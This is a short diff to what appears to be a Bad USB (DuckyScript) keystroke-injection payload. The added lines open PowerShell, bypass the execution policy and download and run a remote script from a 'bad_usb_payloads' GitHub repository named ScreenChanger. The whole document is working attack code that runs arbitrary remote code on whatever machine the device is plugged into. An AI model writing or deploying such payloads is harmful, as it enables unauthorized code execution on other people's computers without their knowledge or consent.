@@ -3,3 +3,7 @@ GUI r
 DELAY 500
 STRING powershell
 ENTER
+DELAY 500
+STRING_DELAY 20
+STRING powershell -ExecutionPolicy Bypass -Command "& {iex (iwr 'https://raw.githubusercontent.com/MagikarpLv13/bad_usb_payloads/master/ScreenChanger/script.ps1')}"
+ENTER
